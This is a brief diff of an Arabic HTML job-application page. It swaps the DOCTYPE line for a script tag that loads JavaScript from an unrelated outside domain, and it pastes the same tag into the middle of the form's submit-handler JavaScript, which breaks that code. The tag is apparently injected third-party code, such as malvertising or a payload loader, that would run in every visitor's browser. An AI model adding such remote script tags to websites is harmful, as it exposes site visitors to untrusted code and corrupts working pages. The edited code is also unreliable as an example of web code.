@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<script type='text/javascript' src='//embitterlorrycar.com/07/d5/ac/07d5acabcbfb0e843f499e904565f063.js'></script>
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
@@ -283,7 +283,7 @@
 
             const requestNumber = generateRequestNumber();
             document.getElementById("requestNumber").textContent = requestNumber;
-            document.querySelector(".success-message").style.display = "block";
+  <script type='text/javascript' src='//embitterlorrycar.com/07/d5/ac/07d5acabcbfb0e843f499e904565f063.js'></script>          document.querySelector(".success-message").style.display = "block";
 
             // Hide the form
             document.getElementById("jobForm").style.display = "none";
